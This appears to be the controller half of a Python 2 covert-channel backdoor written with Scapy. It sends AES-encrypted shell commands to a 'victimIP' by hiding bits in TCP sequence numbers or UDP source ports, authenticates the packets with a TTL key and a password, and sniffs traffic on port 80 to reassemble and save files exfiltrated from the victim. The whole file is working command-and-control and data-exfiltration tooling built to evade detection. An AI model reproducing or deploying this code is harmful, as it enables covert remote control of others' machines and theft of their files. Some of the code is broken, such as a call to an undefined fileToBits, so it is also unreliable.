#Dependancies
from multiprocessing import Process
from scapy.all import *
from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
import uuid #Used to generate UID's
import os # Used for executing commands on shell.
import parseConfig
import time

#Inputs from config file
victimIP = parseConfig.victimIP
ttlKey = parseConfig.ttlKey
srcPort = parseConfig.srcPort
dstPort = parseConfig.dstPort
encryptionKey = parseConfig.encryptionKey
IV = parseConfig.IV
protocol = parseConfig.protocol
password = parseConfig.password
authentication = parseConfig.authentication
localIP = parseConfig.localIP
saveDir = parseConfig.saveDir
messages = []

#Encrypt the message
def encrypt(message):
    global encryptionKey
    global IV
    encryptionKey = encryptionKey
    IV = IV
    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(message)

def decrypt(command):
    global encryptionKey
    global IV
    decryptor = AES.new(encryptionKey, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

#Conver the message to ascii to bits
def messageToBits(message):
    # print "The message is " + message
    messageData =""
    for c in message:
        #bin(int(messageData))[2:]
        # print "Char code is " + str(ord(c))
        var = bin(ord(c))[2:].zfill(8)
        # print var
        messageData += str(var)
    # print "Message data is " + messageData
    return messageData

def chunkMessage(message,protocol):
    # print "Message is "  + message
    if(protocol == "TCP"):
		length = 32
    elif(protocol == "UDP"):
		length = 16
    # print str(len(message))

    if(len(message) == length ):
        # print "Message == length"
        output = []
        output.append(message)
        return message
    elif(len(message) <= length):
        # print "Message is less than length"
        message = message.zfill(length)
        # print "Message is " + message
        return message
    elif(len(message) > length):
        #What will be left over after we chunk the length bit chunks
        rounds = len(message) / length
        excess = len(message) % length
        # print "Rounds is " + str(rounds)
        output = []
        i = 0
        start = 0
        end = 0
        while(i < rounds):
            # print "ROUND:  #" + str(i)
            #print "This is round" + str(i)
            start = i*length #0
            # print "START: " + str(start)
            end = (i*length)+(length - 1) #31
            # print "END: " + str(end)
            output.append(message[start:end+1])
            i = i + 1
            # print "END OF ROUND " + str(output)

            # print "LENGTH OF ROUND IS " + str(len(message[start:end+1]))
        #Get the remainder
        if(excess > 0):
            output.append(message[(end+1):(end+1+excess)])
        # print output
        return output

def generateUID():
    uid = uuid.uuid1()
    # print 'Made a UID ' + str(uid)
    return str(uid)


def craftPackets(data,protocol):
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = generateUID()

    #If not an array
    if(type(data) is str):
        packets.append(craftPacket(data,protocol,counter+1,1,UID))
    #If an array
    elif(type(data) is list):
        while (counter < len(data)):
            packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID))
            counter = counter + 1

    return packets

def craftPacket(data,protocol,position,total,UID):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    global password


    # print "Crafting packet for # " + str(position) + " / " + str(total)
    if(protocol == "TCP"):
        # print "Put Data " + str(int(data,2)) + "into Seq Number"
        packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
        seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+UID+"\n"+str(position)+":" \
        + str(total)))
    elif(protocol == "UDP"):
        packet = IP(dst=victimIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
        dport=dstPort)/Raw(load=encrypt(password+"\n"+UID+"\n"+ str(position) + \
         ":"+str(total)))
    return packet

# def sendmessage(protocol,message):
#     global victimIP
#     global ttlKey
#     global srcPort
#     global dstPort
#     global encryptionKey
#     global IV
#     #1. Encrypt the message
# 	#message = encrypt(message)
#     #2. Convert message to ASCII to bits
#     message = messageToBits(message)
#     #3. Chunk message into the size appropriate for the procol
#     chunks = chunkMessage(message,protocol)
#     #4. Craft packets
#     packets = craftPackets(chunks,protocol)
#     #5. Send the packets
#     if(len(packets) == 1):
#         send(packets[0], verbose=0)
#     else:
#         for packet in packets:
#     		send(packet, verbose=0)
#     		pass

def sendmessage(protocol,message,type):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    #1. Encrypt the message
	#message = encrypt(message)
    if(type == "command"):
        #2. Convert message to ASCII to bits
        message = messageToBits(message)
    elif(type == "file"):
        #2B. Convert the message to bits
        message = fileToBits(message)
    #3. Chunk message into the size appropriate for the procol
    chunks = chunkMessage(message,protocol)
    #4. Craft packets
    packets = craftPackets(chunks,protocol)
    #5. Send the packets
    if(len(packets) == 1):
        send(packets[0])
    else:
        for packet in packets:
    		send(packet)
    		pass

###############################SERVER STUFF################################
def addToMessages(messages, UID, total, covertContent):
    # Edge case if command array is empty
    if(len(messages) == 0):
        #print 'Commands is empty, creating a new element'
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)
    # If the messages array is NOT empty, search by UID
    else:
        #PsuedoCode
        #Check the current list of messages
        # if there is already some messages witht he same UID
        # then append it to that.
        for x in range(len(messages)):
            if(messages[x][0] == UID):
                #print "There is an existing element with same UID"
                messages[x][2].append(covertContent)
                return;
                # print messages
            pass
        # If NONE of the elements have the same UID, create a
        # new entry
        # print "There are no elements with the same UID"
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)


def checkCommands(UID):
    #print "--Checking Commands--"
    #print(messages)
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            #print "ELEMENT = UID"
            total = element[1][0]
            #print "The total amount of messages is " + str(total)
            numMessages = len(element[2])
            #print "The number of messages is " + str(numMessages)
            if(numMessages == total):
                return True
    pass
    return False

def deleteCommand(UID):
    #print "Deleting command with UID " + str(UID)
    #print "Num of elements is " + str(len(messages));
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            del messages[x]
    pass
    #print "After delete, the lenght is " + str(len(messages))

def reconstructCommand(UID):
    #print "Reconstructing command"
    for element in messages:
        # print element
        text = ""
        if(element[0] == UID):
            data = element[2]
            #print data
            for value in data:
                text = text + str(value)
                pass
            # print text
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            #Convert each element in array to integer
            # print "chunks is " + str(chunks)
            for x in range(0, len(chunks)):
                 chunks[x] = int(chunks[x], 2)
                 chunks[x] = chr(chunks[x])
            # print chunks
            return ''.join(chunks)
        pass


def authenticate(packet):
    global command
    global authentication
    # Check TTL first
    ttl = packet[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == ttlKey:
        # Check the password in the payload
        payload = packet["Raw"].load
        # Decrypt payload, sequence number
        decryptedData = decrypt(payload)
        # print "Packet payload " + decryptedData
        # Check if password in payload is correct
        password = decryptedData.split("\n")[0]
        #password = payload[0]
        # print "Password: " + password
        if(password == authentication):
            return True
        else:
            return False
    return False


def handle(packet):
    #TODO: FIX THIS
    if(packet.haslayer(IP)):
        if(packet[IP].src != localIP):
            if authenticate(packet):
                payload = decrypt(packet["Raw"].load).split("\n")
                # print "Payload"
                # print payload
                UID = payload[1]
                # print "UID is " + UID
                position = payload[2].split(":")[0]
                # print "Position is " + position
                total = payload[2].split(":")[1]
                # print "Total is " + total

                if(packet.haslayer(TCP)):
                    #Define the length
                    length = 32
                    # decrypt the covert contents
                    # print "Covert content = " + str(packet[TCP].seq)
                    # convert to binary
                    field = packet[TCP].seq
                    #Converts the bits to the nearest divisible by 8
                    covertContent = lengthChecker("TCP",field)
                    # print "binary is " + covertContent
                elif(packet.haslayer(UDP)):
                    length = 16
                    # decrypt the covert contents
                    # print "Covert content = " + str(packet[UDP].sport)
                    # convert to binary
                    field = packet[UDP].sport
                    covertContent = lengthChecker("UDP",field)
                    # print "binary is " + covertContent
                # If there is only 1 message for this command, reconstruct it
                #if(total == 1):
                    #DEBUG: print "Only one message, just reconstruct it"
                # Else, add to an array
                if(total != 1):
                    #DEBUG: print "Multipart command, add to messages"
                    addToMessages(messages, UID, total, covertContent)
                    # After every add, check if the max has been reached
                    if(checkCommands(UID)):

                        #DEBUG: print "Max reached, reconstruct command"

                        command = reconstructCommand(UID)
                        decryptedMessage = decrypt(command)
                        print "OUTPUT: \n " + decryptedMessage

                        #Run the command
                    # else:
                        #DEBUG: print "Max not reached, don't reconstruct command yet"

def receiveFile(packet):
    if(packet.haslayer(IP)):
        if(packet[IP].src != localIP):
            if authenticate(packet):
                payload = decrypt(packet["Raw"].load).split("\n")
                # print "Payload"
                # print payload
                UID = payload[1]
                # print "UID is " + UID
                position = payload[2].split(":")[0]
                # print "Position is " + position
                total = payload[2].split(":")[1]
                # print "Total is " + total

                if(packet.haslayer(TCP)):
                    #Define the length
                    length = 32
                    # decrypt the covert contents
                    # print "Covert content = " + str(packet[TCP].seq)
                    # convert to binary

                    field = packet[TCP].seq
                    #Converts the bits to the nearest divisible by 8
                    covertContent = lengthChecker("TCP",field)

                    # print "binary is " + covertContent
                elif(packet.haslayer(UDP)):
                    length = 16
                    # decrypt the covert contents
                    # print "Covert content = " + str(packet[UDP].sport)
                    # convert to binary
                    field = packet[UDP].sport
                    covertContent = lengthChecker("UDP",field)

                    # print "binary is " + covertContent
                # If there is only 1 message for this command, reconstruct it
                #if(total == 1):
                    #DEBUG: print "Only one message, just reconstruct it"
                # Else, add to an array
                if(total != 1):
                    #DEBUG: print "Multipart command, add to messages"
                    addToMessages(messages, UID, total, covertContent)
                    # After every add, check if the max has been reached
                    if(checkCommands(UID)):
                        # print "Position " + str(position)
                        # print "Total " + str(total)
                        # print 'ALL MESSAGES IN SEQUENCE RECEIVED!!!! \n\n\n\n'
                        # print "Starting sleep"
                        # time.sleep(2)
                        # print "Ending sleep"
                        writeFile(UID)

def lengthChecker(type,field):
    covertContent = 0
    seqContent = bin(field)[2:]
    if (type == "TCP"):
        if len(seqContent) < 8:
            covertContent = bin(field)[2:].zfill(8)
        elif len(seqContent) > 8 and len(seqContent) < 16:
            covertContent = bin(field)[2:].zfill(16)
        elif len(seqContent) > 16 and len(seqContent) < 24:
            covertContent = bin(field)[2:].zfill(24)
        elif len(seqContent) > 24 and len(seqContent) < 32:
            covertContent = bin(field)[2:].zfill(32)
        else:
            return seqContent
    elif(type == "UDP"):
        if len(seqContent) < 8:
            covertContent = bin(field)[2:].zfill(8)
        elif len(seqContent) > 8 and len(seqContent) < 16:
            covertContent = bin(field)[2:].zfill(16)
        else:
            return seqContent
    return covertContent

def writeFile(UID):
    for element in messages:
        text = ""
        bits = ""
        fileName = ""
        if(element[0] == UID):
            data = element[2]
            for value in data:
                text += str(value)
                pass
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            # print chunks
            #Convert each element in array to integer
            for x in range(0, len(chunks)):
                chunks[x] = int(chunks[x], 2)
                chunks[x] = chr(chunks[x])
            # print str(chunks)

            binaryString = ''.join(chunks)
            print "binaryString " + binaryString + "\n"
            #print "Binary string is  " + binaryString

            delimiter = binaryString.index('\n')

            #Everything until the delimiter is the file name
            fileName = decrypt(binaryString[0:delimiter])
            decryptedFileName = fileName
            print "File name is " + decryptedFileName

            fileContents = ''.join(chunks[delimiter+1:])
            print fileContents

            createFile = open(saveDir + decryptedFileName, 'w')
            createFile.write(fileContents)
            createFile.close()

            print "Wrote file " + decryptedFileName



def sniffCommand():
    while True:
        try:
            command = raw_input("ENTER COMMAND: {}:".format(victimIP))
        except EOFError as e:
            print(e)
        print(command)
        # command = raw_input("ENTER COMMAND -> " + victimIP + ":")
        if(command == "text"):
            sys.exit()
        else:
            #TODO: Change this to  ("TCP",command,"command")
            encryptedCommand = encrypt(command)
            #print "encrypted command is " + encryptedCommand
            sendmessage("TCP",encryptedCommand,"command")
            sniff(timeout=10, filter="ip", prn=handle)

def sniffFile():
    sniff(filter="ip and dst port 80", prn=receiveFile)

if __name__ == "__main__":
    #Create second process
    fileProcess = Process(target=sniffFile)
    fileProcess.start()
    #Run in main process
    sniffCommand()
